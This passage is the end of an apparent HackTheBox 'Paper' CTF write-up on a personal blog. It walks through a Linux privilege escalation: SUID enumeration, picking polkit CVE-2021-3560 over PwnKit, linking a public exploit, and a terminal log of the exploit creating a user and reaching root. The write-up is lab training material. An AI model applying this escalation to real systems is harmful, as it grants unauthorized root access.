+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/userhelper
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+/usr/libexec/qemu-bridge-helper
+/usr/libexec/cockpit-session
+/usr/libexec/sssd/krb5_child
+/usr/libexec/sssd/ldap_child
+/usr/libexec/sssd/proxy_child
+/usr/libexec/sssd/selinux_child
+/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
+/usr/libexec/Xorg.wrap
+</code></pre><p>Ok this was a very confusing part!</p>
+<p>This is what got me on tracks <code>/usr/lib/polkit-1/polkit-agent-helper-1</code></p>
+<p>and checking the forums confirmed it</p>
+<p>also the author had the exploit on his github XD</p>
+<p>still&hellip;its was not obvious at all</p>
+<p>kinda normal as this vlnerability isnt that easy to identify</p>
+<p>But it is old and If you used linpeas you probably did not miss it</p>
+<p>Luckilly I already did two rooms about this on tryhackme</p>
+<p>First I compiled and ran a C exploit for &ldquo;pwnkit&rdquo; but failed</p>
+<p>seems like the author patched that recently!</p>
+<p>its actually <code>CVE-2021-3560</code> that is meant to be used</p>
+<p>Not <code>CVE-2021-4034</code> (PWNKIT)&hellip;ha!</p>
+<p>You can do it manually then using <code>dbus-send</code> like in <a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">here</a></p>
+<p>Or if you are kinda lazy too get a <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">github exploit</a></p>
+<p>Or you can write your own&hellip;</p>
+<p>&rsquo;ey! your choice&hellip;me I chose lazyness</p>
+<pre tabindex="0"><code>[dwight@paper tmp]$ touch exploit.py
+[dwight@paper tmp]$ nano exploit.py
+[dwight@paper tmp]$ python exploit.py
+bash: python: command not found...
+
+[dwight@paper tmp]$ python3 exploit.py
+**************
+Exploit: Privilege escalation with polkit - CVE-2021-3560
+Exploit code written by Ahmad Almorabea @almorabea
+Original exploit author: Kevin Backhouse 
+For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
+**************
+[+] Starting the Exploit 
+id: &#39;ahmed&#39;: no such user
+id: &#39;ahmed&#39;: no such user
+id: &#39;ahmed&#39;: no such user
+id: &#39;ahmed&#39;: no such user
+id: &#39;ahmed&#39;: no such user
+...
+
+[+] User Created with the name of ahmed
+[+] Timed out at: 0.00833322300032699
+Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005
+Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005
+Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.
+Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005
+Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005
+Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005
+...
+
+Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005
+[+] Timed out at: 0.007874564154874596
+[+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root 
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+bash: cannot set terminal process group (106737): Inappropriate ioctl for device
+bash: no job control in this shell
+[root@paper tmp]# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>Now I am ahmed and I can root! look at me go!</p>
+<pre tabindex="0"><code>[root@paper tmp]# cd /root
+[root@paper ~]# ls
+anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
+[root@paper ~]# cat root.txt
+polkit_flag_from_prisonmike
+[root@paper ~]# 
+</code></pre><p>Damn! those &ldquo;easy&rdquo; rooms on hackthebox make me feel more stupid than usual</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/hackthebox/">HackTheBox</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
